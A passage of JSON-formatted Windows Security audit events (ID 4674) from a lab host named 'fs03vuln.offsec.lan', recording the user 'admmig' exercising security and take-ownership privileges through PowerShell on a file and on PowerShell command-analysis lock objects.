%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4423\r\n\t\t\t\t","PrivilegeList":"SeSecurityPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.698359Z"},"EventRecordID":937786,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x214","AccessMask":"18022539","PrivilegeList":"SeSecurityPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.698359Z"},"EventRecordID":937787,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\admmig\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\830X4IIYY3PQS8VSL0MU.temp","HandleId":"0x258","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%1542\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t","PrivilegeList":"SeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.698359Z"},"EventRecordID":937788,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x258","AccessMask":"18809247","PrivilegeList":"SeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937789,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x454","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937790,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x454","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937791,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x458","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937792,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x458","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937793,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x460","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937794,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x460","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937795,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x468","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937796,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x468","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937797,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x470","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937798,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x470","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937799,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x478","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937800,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x478","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937801,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x480","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937802,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x480","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937803,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x488","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937804,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x488","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937805,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x490","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937806,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x490","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937807,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Mutant","ObjectName":"\\BaseNamedObjects\\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111","HandleId":"0x498","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4448\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.963984Z"},"EventRecordID":937808,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"-","ObjectName":"-","HandleId":"0x498","AccessMask":"2031617","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
